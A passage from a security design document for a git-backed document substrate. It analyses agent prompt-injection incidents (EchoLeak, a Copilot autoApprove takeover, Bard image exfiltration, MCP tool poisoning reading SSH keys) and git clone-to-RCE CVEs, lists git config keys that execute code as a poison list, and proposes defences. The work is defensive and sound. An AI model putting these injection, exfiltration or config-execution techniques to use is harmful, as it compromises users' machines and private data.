   intermediate" ergonomics that `.calc.md` already has (per `RESEARCH.md` §3,
   named variables with units) must come from the substrate, not from CEL.
3. **IEEE-754 doubles only.** The spec: "CEL provides no way to control the
   finer points of floating-point arithmetic." For a product whose flagship
   artifact is a financial table, binary floating point is a correctness bug
   waiting to be filed. This is the disqualifying one.
4. Macros are `has`, `all`, `exists`, `exists_one`, `map`, `filter` over
   already-materialised collections — genuinely close to `SUMPRODUCT`/`FILTER`,
   but the spec itself warns they "can lead to exponential behavior when nested
   or chained."

**So: build the formula language, and take CEL's guarantees rather than CEL.**
Concretely, the surface is the Kova-style named-column syntax already chosen in
`RESEARCH.md` §3 with IronCalc's function library, and the *evaluator* is
constrained to CEL's contract:

- Total: no `while`, no user recursion, comprehensions over finite collections
  only. Termination is structural, not a timeout.
- Deterministic: no clock, no RNG, no locale, no environment, no filesystem, no
  network — not disabled, **absent from the grammar**. There is no `WEBSERVICE`,
  no `IMPORTXML`, no `HYPERLINK`-that-fetches, no `INDIRECT` over a path, no
  `DDE`. §2.1's entire payload list is unparseable rather than blocked.
- Decimal arithmetic by default, not binary floating point.
- A static cost estimate *and* a runtime step/memory budget, both surfaced. On
  budget exhaustion: an explicit error in the cell. Never a partial value, never
  a stale value — this is the same diagnostics imperative `RESEARCH.md` §3
  reached for missing column references.
- Cross-artifact references resolve only within the repository, by repo-relative
  path, with no `..` and no symlink traversal (see §6.5 — this is where the
  substrate inherits git's checkout-guard problem and must not rely on a single
  predicate).

**And the sandbox, secondarily.** With P1–P3 the evaluator handles no untrusted
*code*, only untrusted *data* — so the residual risk is memory-safety bugs in
the evaluator and its parsers (R2: CVE-2018-17407 was a font parser). That is
the right size of problem for a memory-safe implementation language plus
defence-in-depth, not for gVisor:

- Write the evaluator and every parser reachable from repo bytes in a
  memory-safe language. IronCalc being Rust is a real advantage here, and it is
  a security argument for that choice, not only a licensing one
  (`RESEARCH.md` correction 2).
- Run derivation in a **separate OS process** from the UI, with the budget
  enforced by the supervising process — so a hang or OOM in evaluation is a
  killable child, not a frozen editor.
- Apply OS confinement to that child **best-effort per platform**: seccomp +
  Landlock (negotiating the ABI level actually present) on Linux, the sandbox
  APIs on macOS, an AppContainer/job object on Windows. Explicitly
  defence-in-depth. Do **not** let any correctness or security claim depend on
  it, because §3.1 shows it is unavailable or weaker on some target platform,
  always.
- Do **not** adopt Wasm for the formula layer. Its capability model is the right
  idea, but P1–P3 already deliver "no ambient authority" without shipping a JIT
  that had two Critical sandbox escapes in April 2026, or paying 45–55%. Wasm's
  place is §6.6: the *plugin* boundary, where third-party code genuinely is
  arbitrary and a real isolation boundary is genuinely required.

---

## 5. Agents: the substrate is the trifecta by construction

### 5.1 The framing

Greshake et al., "Not what you've signed up for: Compromising Real-World
LLM-Integrated Applications with Indirect Prompt Injection" (arXiv 2302.12173,
AISec 2023) established that adversaries can "remotely exploit LLM-integrated
applications by strategically injecting prompts into data likely to be
retrieved" — the attacker never touches the user's prompt, only the *content the
model reads*. `[UNVERIFIED: exact six-category taxonomy wording (information
gathering / fraud / intrusion / malware / manipulated content / availability) —
the abstract fetch surfaced "data theft," "worming," and "information ecosystem
contamination" but not a verbatim six-way enumeration.]`

Simon Willison's **lethal trifecta** (`simonwillison.net/2025/Jun/16/the-lethal-trifecta/`)
is the operative framing: (1) access to private data; (2) exposure to untrusted
content — "any mechanism by which text or images controlled by a malicious
attacker could reach your LLM"; (3) the ability to externally communicate. The
danger is the *conjunction*.

**Apply it to this product without flinching.** An agent with repo access holds
private data (every other artifact in the repo, and every other repo on disk). A
cloned repo *is* untrusted content — it is a file full of attacker-authored text
that the agent is explicitly designed to read; `RESEARCH.md` §7 makes
"agent-native" the market case. And an agent in a git workflow has external
communication by definition: it can `git push`. **The substrate is not exposed
to the lethal trifecta; it instantiates all three legs as product features.**
This is the single most important sentence in this document.

Willison's other two relevant positions: he coined the term in 2022
(`simonwillison.net/2022/Sep/12/prompt-injection/`) — "'Prompt injection' is
when an AI that uses textual instructions (a 'prompt') to accomplish a task is
tricked by malicious, adversarial user input to perform a task that was not part
of its original objective, akin to a SQL injection" — and he rejects filters:
vendors advertising a 95% catch rate represent a failing bar in an adversarial
setting. Also, from the trifecta post: "once an LLM agent has ingested untrusted
input, it must be constrained so that it is impossible for that input to trigger
any consequential actions."

### 5.2 It is not theoretical — the incident record

**EchoLeak / CVE-2025-32711** (Microsoft 365 Copilot), verified via NVD:

> "AI command injection in M365 Copilot allows an unauthorized attacker to
> disclose information over a network."

CWE-74. NVD scores it 7.5 HIGH; **Microsoft's own secondary score is 9.3
CRITICAL** (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N). Note the vulnerability class
in Microsoft's own words is "AI command injection" — a first-party vendor
CWE-mapped label, not researcher commentary. `[UNVERIFIED: the Aim Labs writeup
detailing the zero-click email→RAG→exfil mechanism — aim.security now 301s to
catonetworks.com and the landing page returned no fetchable content. The CVE
record and MSRC reference are solid; the narrative mechanism is not
independently re-verified here.]`

**CVE-2025-53773** (GitHub Copilot / Visual Studio), verified via NVD:

> "Improper neutralization of special elements used in a command ('command
> injection') in GitHub Copilot and Visual Studio allows an unauthorized
> attacker to execute code locally."

CVSS 7.8 HIGH, CWE-77, Visual Studio 2022 17.14.0–17.14.11. The mechanism, per
embracethered.com: injection embedded in source code, issues, or web content
instructs Copilot to write `.vscode/settings.json` with
`"chat.tools.autoApprove": true` — flipping the agent into unattended mode so it
then executes arbitrary OS commands without confirmation, with self-propagating
"ZombAI" chains across infected repos.

**Read that one twice.** The payload was *a file in a repository* that caused an
agent to *rewrite the local configuration that governed its own permissions*.
This is the exact shape of the thing this substrate is contemplating: per-repo
behaviour configured by checked-in files, read by an agent. It has already
happened, it has a CVE, and it was patched in August 2025.

**Google Bard markdown-image exfiltration** (Rehberger, embracethered.com):
"When Google's LLM returns text it can return markdown elements, which Bard will
render as HTML! This includes the capability to render images." The CSP bypass
came from Google Apps Script running on `script.google.com`/`googleusercontent.com`
— **domains already inside Google's own allowlist**. Rehberger compares them to
"Office Macros." Reported 2023-09-19, fixed by 2023-10-19.

**ChatGPT memory** (Rehberger): injection via connected apps (Google Docs,
OneDrive), image uploads, and browsing could write unauthorized long-term
memories, with "Tool Chaining" and "Delayed Execution" bypasses surviving the
first mitigations. OpenAI's bug bounty triage closed the original report as a
"Model Safety Issue" rather than a security vulnerability. `[UNVERIFIED: the
`url_safe` endpoint specifics.]`

`[UNVERIFIED — no primary source reached; do not cite: CamoLeak (GitHub Copilot
Chat / Camo exfiltration); PromptArmor's Slack AI exfiltration (Aug 2024); the
Amazon Q Developer extension malicious-commit incident (Jul 2025);
AgentFlayer/Zenity ChatGPT Connectors (Black Hat 2025).]`

### 5.3 MCP — because "agent-native" means an MCP surface

Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks"
(`invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks`,
2025-04-01): hidden instructions in tool *descriptions* — text the model reads
in full while the user sees a simplified UI. Their worked example has a poisoned
`add` tool instruct the agent to read `~/.cursor/mcp.json` and `~/.ssh/id_rsa`
and exfiltrate through a disguised parameter. Quoted:

> "Users have no visibility into the full tool descriptions, AI models are
> trained to follow these instructions precisely, and malicious behavior is
> concealed behind legitimate functionality."

Affected clients named: Anthropic, OpenAI, Zapier, Cursor. The same disclosure
covers **rug pulls** (servers mutating tool descriptions after approval,
defeating one-time consent) and **tool shadowing**, where one server's
description alters how the model treats a *different, trusted* server's tools —
"an attacker does not necessarily need to get the agent to use their tool."

Real MCP CVEs, all NVD-verified:

| CVE | Component | CVSS | Verbatim |
|---|---|---|---|
| CVE-2025-6514 | `mcp-remote` 0.0.5–0.1.15 | 9.6 CRIT | "mcp-remote is exposed to OS command injection when connecting to untrusted MCP servers due to crafted input from the authorization_endpoint response URL." |
| CVE-2025-49596 | MCP Inspector <0.14.1 | 9.4 CRIT | "...vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio." |
| CVE-2025-53109 | `modelcontextprotocol/servers` Filesystem | 7.3 HIGH | "...could allow access to unintended files via symlinks within allowed directories." |
| CVE-2025-53110 | same | 7.3 HIGH | "...could allow access to unintended files in cases where the prefix matches an allowed directory." |

The last two are the **Anthropic-maintained reference filesystem MCP server**,
and they are precisely the two bugs a repo-scoped agent tool will have: symlink
escape, and `/allowed-dir-evil` passing a prefix check for `/allowed-dir`. If
the substrate ships an MCP server exposing repo files — and "agent-native"
means it will — these are its first two CVEs unless the path check is
canonicalise-then-compare-by-component with symlinks resolved and rejected at
the boundary, not string-prefix.

The MCP spec's own security-best-practices page
(`modelcontextprotocol.io/specification/.../basic/security_best_practices`) is a
usable primary source and states, among others, that "MCP servers MUST NOT
accept any tokens that were not explicitly issued for the MCP server"
(token-passthrough is a named anti-pattern), plus confused-deputy risks in OAuth
proxies, SSRF via metadata discovery, a MUST NOT on using sessions for
authentication, and mandatory untruncated-command consent dialogs for local
server launch.

### 5.4 What actually works, and what does not

**Does not work:** filters and classifiers. Microsoft's Spotlighting
(arXiv 2403.14720) — delimiting, datamarking, encoding to give "a reliable and
continuous signal of provenance" — reduced attack success "from greater than 50%
to below 2%." That is an excellent result for a mitigation and an unacceptable
one for a boundary. Same for OpenAI's instruction hierarchy (arXiv 2404.13208),
which trains models to obey "an instruction hierarchy that explicitly defines
how models should behave when instructions of different priorities conflict" and
"drastically increases robustness — even for attack types not seen during
training." Both are worth having. Neither is a security control.

**Works, structurally:** Willison's **dual LLM pattern**
(`simonwillison.net/2023/Apr/25/dual-llm-pattern/`) — a Quarantined LLM that
"does not have access to tools, and is expected to have the potential to go
rogue at any moment," a Privileged LLM with tools that only sees trusted input,
and a non-AI Controller between them, with the rule that "unfiltered content
output by the Quarantined LLM is never forwarded on to the Privileged LLM"
(opaque variable tokens are substituted instead). Willison is candid about the
cost: "building AI assistants in this way is likely to result in a great deal
more implementation complexity and a degraded user experience."

**CaMeL** (Google DeepMind, arXiv 2503.18813, "Defeating Prompt Injections by
Design") is the same idea with numbers: "CaMeL explicitly extracts the control
and data flows from the (trusted) query; therefore, the untrusted data retrieved
by the LLM can never impact the program flow," enforced by capability-based
authorization. Measured on AgentDojo: **77% task success with provable security
guarantees vs 84% for an undefended baseline** — a real but modest utility cost.

### 5.5 The architectural requirements

These are requirements, not recommendations, and they follow from §5.1 being
true by construction.

**A1. Break a leg of the trifecta, and the leg to break is egress.** The other
two are the product. Therefore: **an agent session that has read any untrusted
repo content must not thereafter reach an arbitrary network destination.** Not
"should be careful" — the egress allowlist is enforced by the substrate, out of
the model's control, in the same way Cloudflare enforces network policy under
V8 rather than inside it.

**A2. No automatic outbound fetch of any URL originating in repo content.
Ever.** This is the markdown-image lesson, and it generalises far past images.
The vendor fixes converge on exactly one answer: never let content-derived URLs
produce a direct request. GitHub's Camo proxies every embedded image so that
"your browser information won't be leaked to other third party services"; Google
used CSP (and got burned by its own allowlist). For this product the rule is
stronger and simpler than a proxy, because a proxy still leaks *timing and
existence*: **repo-sourced URLs are not fetched at all.** Images render from
repo-relative paths or from the content-addressed store (`RESEARCH.md` §4);
remote images render as a click-to-load placeholder showing the literal URL.
No remote fonts, stylesheets, favicons, link previews, or schema `$ref`
resolution. §1.3's PDF/A precedent — "External content references are
forbidden" — is the same rule, reached independently forty years earlier.

**A3. Untrusted content must be structurally marked at the substrate boundary,
not by the model.** When the substrate hands artifact bytes to an agent, they
are wrapped as data with provenance (repo, path, trust state), and the wrapper
is applied by the tool layer. Spotlighting-style datamarking is worth doing
*inside* that wrapper as depth, given the >50%→<2% result — but its value is
depth only, and A1/A2/A4 must hold with it removed.

**A4. Plan-then-execute: no new tool call may be authorised by untrusted
content.** The action set for a task is fixed from the user's instruction before
untrusted bytes are read. This is CaMeL's "untrusted data retrieved by the LLM
can never impact the program flow," and the price is CaMeL's measured ~7 points
of task success.

**A5. Writes to anything that governs agent permissions are forbidden to
agents.** CVE-2025-53773 is the whole argument. The substrate's trust records,
plugin registry, and permission state live *outside the repo* (§6.5) and are not
writable by any agent-invoked tool, at any trust level, with no override.

**A6. The repo-file MCP surface is path-confined by canonicalisation, not by
prefix**, with symlinks resolved and cross-boundary links refused —
CVE-2025-53109 and CVE-2025-53110 in the reference implementation.

**A7. Tool descriptions are versioned and pinned.** A change to any MCP tool
description or schema invalidates consent and re-prompts. That is the rug-pull
defence, and it costs nothing.

**A8. Say it in the docs.** The substrate must state plainly that an agent
pointed at an untrusted repo with network access is the lethal trifecta, and
that the mitigation is A1. Users will otherwise reconstruct the vulnerability
with their own tooling, and §1.1 shows that the only control that ever worked
was a *default*.

---

## 6. Repo trust: what git already teaches, and where the design is walking into it

### 6.1 What a signed commit proves

It proves a key signed a commit object. It does not prove the content is safe,
reviewed, or authored by whom it says: **author and committer fields are free
text**, set from local config, and a signature over a commit containing a forged
author line is a valid signature over a forged author line. For this substrate
the practical consequence is that signatures are useful for *attributing a
change to a key you already trust*, and useless as an input to "may this repo's
declared behaviour run." Trust must be a local decision about a *repository*,
not a derived property of a signature.

SHA-1's collision resistance is gone — SHAttered (2017) and "SHA-1 is a
Shambles" (Leurent & Peyrin, 2020) for chosen-prefix — and git mitigates with
Marc Stevens' collision-detecting `sha1dc` rather than by migrating. SHA-256
object format exists (`git init --object-format=sha256`) but interop remains the
blocker and forge support is the practical limit. `[UNVERIFIED: current 2026
status of the hash-function transition, SHA-1↔SHA-256 interop implementation
state, and GitHub/GitLab SHA-256 repo support — not fetched this session.
Treat as an open item; do not assert a status.]` The design consequence is mild
and worth stating: content-addressing in the *derivation engine* should use
SHA-256 and must not be assumed to inherit git's object hash.

### 6.2 The clone-is-RCE class, verified

All descriptions verbatim from NVD.

**CVE-2024-32002** — CVSS **9.0 CRITICAL** (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H),
CWE-22 + CWE-434 + CWE-59:

> "Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4,
> repositories with submodules can be crafted in a way that exploits a bug in
> Git whereby it can be fooled into writing files not into the submodule's
> worktree but into a `.git/` directory."

Hooks written into `.git/` execute during the clone, **before any code can be
inspected**.

**CVE-2024-32004** — CVSS 7.8 HIGH, CWE-114:

> "an attacker can prepare a local repository in such a way that, when cloned,
> will execute arbitrary code during the operation."

**CVE-2022-24765** — CVSS 7.8 HIGH, CWE-427 (Uncontrolled Search Path Element):
a `.git` folder at `C:\.git` that "Git operations will respect," affecting "users
working on multi-user machines, where untrusted parties have write access to the
same hard disk," reaching Git Bash, PowerShell, Visual Studio and IDEs. Fixed in
Git for Windows v2.35.2; this is the CVE that introduced `safe.directory`.

**CVE-2025-48384** — CVSS 8.0 HIGH, CWE-59 + CWE-436, and **listed in CISA's
Known Exploited Vulnerabilities catalog**:

> "When reading a config value, Git strips any trailing carriage return and line
> feed (CRLF). When writing a config entry, values with a trailing CR are not
> quoted, causing the CR to be lost when the config is later read. When
> initializing a submodule, if the submodule path contains a trailing CR, the
> altered path is read resulting in the submodule being checked out to an
> incorrect location. If a symlink exists that points the altered path to the
> submodule hooks directory, and the submodule contains an executable
> post-checkout hook, the script may be unintentionally executed after checkout."

This is the sharpest single item in the document. **A stray carriage return in a
config string — a round-trip asymmetry between the writer and the reader —
became actively-exploited remote code execution on `git clone`.** Not a logic
error, not a missing check: a *serialisation* bug. Any substrate that reads
per-repo declarative configuration from checked-in files inherits this exact
risk class, and it is the reason §6.5's rules are about what config can *mean*,
not about parsing it carefully.

`[UNVERIFIED: CVE-2024-32020, CVE-2024-32021, CVE-2023-25652, CVE-2023-29007,
CVE-2018-11235, CVE-2021-21300, CVE-2025-48385/48386, CVE-2025-27613,
CVE-2025-46334/46835 — not individually confirmed via NVD this session. The four
above are confirmed; do not cite the others from this document.]`

### 6.3 Git hooks are not cloned — measured, and the reasoning

Measured (Appendix A.1): a repo whose `.git/hooks/post-checkout` writes a marker
file, cloned; the clone's hooks directory contains only `*.sample` and the
marker was never written. Git's own `githooks(5)`:

> "Hooks are programs you can place in a hooks directory to trigger actions at
> certain points in git's execution. Hooks that don't have the executable bit
> set are ignored."

> "By default the hooks directory is `$GIT_DIR/hooks`, but that can be changed
> via the `core.hooksPath` configuration variable."

> "`git init` may copy hooks to the new repository, depending on its
> configuration."

The mechanism is simple and total: **`.git/hooks/` is not inside any tree
object.** There is no encoding by which a hook can be delivered over the wire.
Hooks arrive only from `init.templateDir` / `git clone --template` — a local
choice, made once, applying to repos the user creates. Three defences stack:
not-in-a-tree; the executable bit; and `verify_path()` refusing to check out any
path under `.git/`.

That third one, measured (Appendix A.3): a tree entry named `.git` **can** be
created as an object, `fsck --strict` reports `hasDotgit: contains '.git'`, and
`read-tree`/`checkout` both refuse with `error: invalid path
'.git/hooks/post-checkout'`. So the object layer is permissive and the checkout
layer is the guard — which is exactly why every CVE in §6.2 is a *bypass of the
checkout guard* (symlink, case-insensitive filesystem, submodule path, trailing
CR) rather than a direct write. **One predicate, four bypasses in three years.**

### 6.4 The pattern the design is about to reproduce

Stated plainly: **the substrate wants per-repo behaviour configured by
checked-in files. That is the npm `postinstall` pattern, the CVE-2024-32002
pattern, and the CVE-2025-53773 pattern.** It is the single most dangerous
structural choice available, and it is dangerous precisely because it is so
useful — which is §1.2's "it's a feature" all over again.

Git already solved it, and the solution is measurable. Appendix A.2 and the
filter test: `.gitattributes` clones (it is a tracked file), and `check-attr`
in a fresh clone confirms `filter: myfilter` and `diff: mydiff` are *active
attributes*. But `filter.myfilter.smudge` is undefined, and checkout proceeds
with raw content, exit 0, no warning. Define it locally —
`git config filter.myfilter.smudge 'sed s/plaintext/SMUDGED/'` — and the very
next checkout produces `SMUDGED`. Git's own `gitattributes(5)` states the split:

> "The definition of a merge driver is done in the `.git/config` file, not in the
> `gitattributes` file, so strictly speaking this manual page is a wrong place
> to talk about it."

> "The definition of a diff driver is done in `gitconfig`, not `gitattributes`
> file"

> "A `filter` attribute can be set to a string value that names a filter driver
> specified in the configuration."

**This is the whole architecture in three sentences.** The repository supplies a
*name* and a *scope* (which paths). The local configuration supplies the *code*.
The repository can express "these files want the `daffmerge` treatment" and can
never express what `daffmerge` does. Selection travels; capability does not.

Two honest caveats. First: git's own documentation contains **no explicit
security warning** about this — the `.gitattributes` page frames the split as
organisational, not as a boundary. It is a security property git has and does
not advertise, which means it is a property git could erode without noticing,
and one the substrate must state explicitly for itself. Second: the fail-open
behaviour is genuinely bad UX and is already an established hard constraint in
this project — Appendix A.2 shows the declared merge driver silently absent and
the sheet resolving to conflict markers. **The security property and the UX
defect are the same mechanism.** The fix is therefore not to make definitions
travel; it is to make absence *loud*.

The counterexample confirms the rule. npm executes `postinstall` on install, and
the entire supply-chain attack industry follows from that one decision.
`[UNVERIFIED: 2025 "Shai-Hulud" npm worm details and any figures on malicious
packages using install scripts — not fetched.]` The lesson stands without the
numbers: **auto-execution on acquisition is the original sin.**

### 6.5 The rules

**Never auto-executed from a clone, at any trust level:**

1. Any hook, of any kind, from repo content. The substrate's own hook analogue
   does not exist.
2. Any code in any language delivered as repo bytes: merge drivers, diff
   drivers, clean/smudge filters, formatters, linters, importers, formula
   plugins, schema validators, migration scripts, template helpers.
3. Any `git config` supplied by, derived from, or influenced by repo content.
   The substrate never writes local git config on the user's behalf as a result
   of reading a repo. The keys confirmed present in this git's `git-config(1)`
   that cause execution — `core.fsmonitor`, `core.fsmonitorHookVersion`,
   `core.sshCommand`, `core.askPass`, `core.hooksPath`, `core.editor`,
   `core.pager`, `credential.helper`, `diff.external`, `sequence.editor`,
   `uploadpack.packObjectsHook`, plus `filter.*.clean`/`.smudge`,
   `merge.*.driver`, `diff.*.textconv`, and any `alias.*` beginning with `!` —
   are a **poison list**: never set from repo content, never merged from repo
   content, never templated from repo content.
4. Any network fetch triggered by repo content (§5.5 A2), including plugin
   auto-install. A repo naming a plugin never causes that plugin to be
   downloaded.
5. Anything at all during `clone`, `fetch`, `pull`, `checkout`, or open. The
   acquisition path executes nothing but git and the substrate's own parsers.

**May be declared by a repo, and is safe because it is inert data:**

- Which paths are which artifact type; per-path formatting and rendering options.
- Column names, types, units, and formulas — evaluated under §4.5's total
  language, which is why this is safe.
- Derivation *dependencies* as a declarative graph: which artifact feeds which,
  expressed as repo-relative paths. Not how to compute them beyond §4.5's
  language.
- Schemas and validation rules, expressed in the same total language. No
  external `$ref`. No remote schema resolution.
- The *name* of a merge driver, formula extension, or plugin, plus a version
  constraint and a content hash. Naming is a request; binding is the user's.

**The trust model:**

- **TOFU, per repo, keyed locally.** On first sight a repo is `untrusted`. The
  record lives in local application state keyed by remote URL + root-commit OID.
  Never in the repo, never in `.git/config`, never anywhere an agent can write
  (§5.5 A5). Submodules do not inherit trust. Same-host does not imply trust.
- **Untrusted is fully functional** for everything in the "may be declared"
  list. This is the point of §4: the common case needs no prompt, so the rare
  prompt is meaningful.
- **Elevation is explicit, itemised, and per-capability.** "Trust this repo"
  is not a checkbox; it lists each named binding being activated — *"`daffmerge`
  → the daff plugin you installed on 2026-03-02"* — and each must already be
  installed locally. Trust selects among installed capabilities; it never
  installs.
- **Consent is invalidated by change.** Following §5.5 A7 and the rug-pull
  pattern: if the set of named bindings a repo requests changes, consent for the
  new ones is re-sought. Hash the declaration block; a changed hash re-prompts.
- **Revocable, and visible.** A single list of trusted repos and what each is
  allowed, with one-click revocation.
- **Loud degradation, always.** A declared-but-unbound name produces a visible,
  in-document notice naming what is inactive and why. This is where the
  substrate should *beat* git rather than copy it (Appendix A.2), and it is the
  same diagnostics imperative `RESEARCH.md` §3 reached for missing columns:
  never zero, never empty, never stale, never silent.

**And one rule for the substrate's own code**, from R2 and CVE-2018-17407: every
parser reachable from repo bytes — markdown, CSV, table, formula, schema,
`.fods` XML, image, font — is an execution primitive. Memory-safe
implementation, fuzzed, and no path validation that rests on a single predicate.
Git's `verify_path()` had four bypasses; the substrate should assume its own
equivalent has more.

### 6.6 Plugins: the one place a real sandbox is required

When a user *does* install a formula plugin or merge driver, that is third-party
code and §4's totality argument does not apply to it. This is where WebAssembly
belongs, and only here: a component-model plugin with an explicit import list,
no ambient authority, no WASI filesystem or socket capabilities granted by
default, and a declared capability manifest shown at install time. The 45–55%
overhead is irrelevant at plugin granularity, and the April 2026 wasmtime
escapes are acceptable at *install-time consent* granularity in a way they are
not for silently opening a stranger's spreadsheet.

---

## 7. Sharing and multi-tenancy: encryption is not the answer

`RESEARCH.md` §6 already establishes that no forge has per-file read ACLs. The
options are separate repos, submodules, filtered mirrors, or per-file
encryption. This section disposes of encryption on measured grounds.

### 7.1 git-crypt's design, and why it is fatal here

git-crypt's README (`github.com/AGWA/git-crypt`) describes the construction:

> "AES-256 in CTR mode with a synthetic IV derived from the SHA-1 HMAC of the
> file"

framed as "provably semantically secure under deterministic chosen-plaintext
attack." Deterministic encryption is a deliberate, correct choice — it makes
identical plaintexts produce identical blobs so git can store them once. But the
nonce is derived from the **whole plaintext**, so any edit changes the nonce and
therefore the entire keystream.

Measured (Appendix A.4): on a 2,963-byte, 201-row CSV, a **one-line edit changed
99.5% of the ciphertext bytes**. And git-crypt says the consequence itself:

> "even the smallest change to an encrypted file requires git to store the
> entire changed file"

Then the merge, measured with real git on two disjoint edits 188 lines apart —
the easiest possible case. Plaintext: clean auto-merge, one line changed, zero
conflict markers. Ciphertext: `CONFLICT (content)`, and forcing `-text diff` in
`.gitattributes` did not help. The conflict is unresolvable by the user (both
sides are ciphertext) and by the tool (merge sees the `clean`ed blobs, not the
smudged working tree).

**And the real-world failure is worse than a conflict.** git-crypt issue #140
reports a merge of encrypted files producing *no conflict markers at all* — "the
conflicted files are not changed at all, and I can't find any `<<<<<<< HEAD`
inside." That is **silent data loss**, which is the same failure mode as
`RESEARCH.md` §3's A1-merge result (480 instead of 660, no marker) and should be
treated as equally disqualifying.

### 7.2 Revocation does not exist

git-crypt's README, verbatim:

> "git-crypt does not support revoking access to an encrypted repository which
> was previously granted."

This holds in both GPG and symmetric modes: rotation protects future commits
only, because the departing collaborator already holds the key and the history.
Transcrypt is the same shape (AES-256-CBC, per-file salt from an HMAC-SHA256 of
filename+password) and its README concedes rekeying "will remove your ability to
see historical diffs of the encrypted files in plain text" — i.e. rekeying costs
*you* history and costs the ex-collaborator nothing. `[UNVERIFIED: SOPS's own
statement on old ciphertext after `updatekeys`; the structural conclusion is
forced by git's immutability regardless.]`

### 7.3 Metadata leaks anyway

git-crypt, verbatim:

> "git-crypt does not encrypt file names, commit messages, symlink targets,
> gitlinks, or other metadata."

> "git-crypt does not hide when a file does or doesn't change, the length of a
> file, or the fact that two files are identical."

For a document substrate, filenames and commit messages are frequently the most
sensitive thing in the repo. Encrypting the bodies of `Q3-layoffs/severance-list.sheet.md`
protects very little.

### 7.4 The others

**SOPS** encrypts values, not files: "SOPS is an editor of encrypted files that
supports YAML, JSON, ENV, INI and BINARY formats." Leaf values are encrypted
while keys and structure stay cleartext, which genuinely does merge better —
edits to different keys can auto-merge. **But markdown and CSV are not on that
list**, so this substrate's formats fall back to whole-file BINARY mode and
inherit every git-crypt problem. SOPS is the right tool for a config file and
the wrong tool for a document.

**age** is a file-encryption tool, not a git integration: no `.gitattributes`
filter, no git key management, no revocation story. Wiring it in via a custom
filter reproduces §7.1 exactly.

git-crypt is actively maintained (0.8.0, 2025-09-23). Maintenance is not the
problem; the construction is.

### 7.5 Recommendation

**Do not ship per-file encryption for sharing.** It defeats merge (the product
premise), it defeats diff, it defeats delta compression (turning documents into
attachments, which `RESEARCH.md` §4 identifies as the bloat driver), it leaks
the filenames that usually matter most, and it cannot revoke. Four of those five
are measured or quoted from the projects themselves.

Encryption has exactly one defensible role here: **at rest, for a whole
repository, on a shared device** — orthogonal to sharing, and not via clean/
smudge filters.

For actually sharing a subset, in preference order:

1. **Separate repositories on a boundary that means something.** The repo is the
   ACL because it is the only thing forges can express. This is also consistent
   with `RESEARCH.md` §4's single-writer-per-repository constraint: sharing
   boundaries and writer boundaries want to coincide anyway.
2. **A filtered projection**, if a subset must be shared without splitting the
   source. **josh** (`josh-project`) is the strongest candidate — a git proxy
   offering "a blazingly-fast, incremental, and reversible implementation of git
   history filtering," explicitly "a non-destructive, reversible operation"
   where a filtered view "seamlessly relates histories between repos, which can
   be used by developers and CI systems interchangeably." That is materially
   better than `git subtree split` or `filter-repo` static exports, which are
   one-way projections needing manual re-integration. `[UNVERIFIED: exact
   push-back mechanics — the fetched docs give "reversible"/"interchangeably"
   language but not a worked push example. Confirm before depending on it.]`
   Note the cost: josh is a server, which concedes ground on "git is the
   backend" in the same way `RESEARCH.md` §1 criticises Moment and Perchpad for.
3. **Submodules** only where the boundary is already a directory and the
   audience already clones. Note that submodules are the delivery vehicle in
   CVE-2024-32002 and CVE-2025-48384; if they are used, §6.5's rules apply to
   them with no inheritance of trust.

---

## 8. PII and the right to erasure

### 8.1 The problem is real and is not solved by tooling

`git filter-repo` is the sanctioned tool — git's own `filter-branch` man page,
verbatim from the installed page (Appendix A.5), says filter-branch "has a
plethora of pitfalls that can produce non-obvious manglings," that these "cannot
be backward compatibly fixed and as such, its use is not recommended," and
directs users to filter-repo. But rewriting changes every downstream SHA, so it
requires a force-push, a hard re-clone by every collaborator, and it invalidates
every open PR.

And it does not actually delete. GitHub's own documentation
(`docs.github.com/.../removing-sensitive-data-from-a-repository`):

> "Contact us through the GitHub Support portal... Support will then:
> Dereference or delete any affected PRs on GitHub. Run a garbage collection on
> the server to expunge the sensitive data from storage. Remove cached views."

Users cannot self-serve a purge. On forks:

> "If the commit that introduced the sensitive data exists in any forks, it will
> continue to be accessible there. You will need to coordinate with the owners
> of the forks... GitHub cannot provide contact information for these owners."

And GitHub's actual advice is to give up on deletion:

> "if the sensitive data you need to remove is a secret (e.g.
> password/token/credential)... you need to revoke and/or rotate that secret."

Truffle Security's 2024 research
(`trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github`,
Joe Leon) makes it categorical:

> "You can access data from deleted forks, deleted repositories and even private
> repositories on GitHub. And it is available forever."

They name it **Cross Fork Object Reference (CFOR)**; access requires only the
commit hash, and a 4-hex-character short prefix is 65,536 guesses. Scanning
"literally 3" commonly-forked public repos from one large AI company, they
"easily found 40 valid API keys from deleted forks." GitHub's position:

> "After reviewing the documentation, it's clear as day that GitHub designed
> repositories to work like this."

GitLab is more honest but no better: housekeeping "prunes unreachable objects
with a grace period of two weeks," reducible to 30 minutes manually, but
"Pruning unreachable objects does not guarantee the removal of leaked secrets
and other sensitive information." Locally, git's own defaults (Appendix A.5)
are `prune --expire 2.weeks.ago` and `gc.reflogExpireUnreachable` 30 days.

Ink & Switch's Upwelling states the general form, and the exact wording is
confirmed (`inkandswitch.com/upwelling/`, Future work → Permissions and sharing):

> "Because Upwelling currently records and shares the full history of a
> document, there is no way to excise names or information that may have
> appeared in earlier drafts."

Note also that **commit author name and email are themselves personal data**
under GDPR Art. 4(1), in every commit, unremovable without a full rewrite. A
substrate that auto-commits on save (per `RESEARCH.md` §1's competitor
vocabulary) generates this continuously.

### 8.2 The answer, which must be architectural

Deletion cannot be retrofitted onto git history. So the answer is to **arrange
for the sensitive material never to be in history in the first place**, which is
exactly the pattern CNIL reached for blockchains
(`cnil.fr/en/blockchain-and-gdpr-solutions-responsible-use-blockchain-context-personal-data`):
"it is important not to store personal data in cleartext on a blockchain," with
"blocking access to data depending on the format chosen (e.g., commitment,
fingerprint generated by a hash function with a key, encryption, etc.)" as the
route toward compliance. `[UNVERIFIED: CNIL's precise Article 17 language and
any explicit "delete the key = erasure" equivalence — the fetched page is a
summary of a longer position paper.]`

The substrate must therefore **specify** the following, not disclaim it:

**E1. A declared class of content that never enters git history.** The design
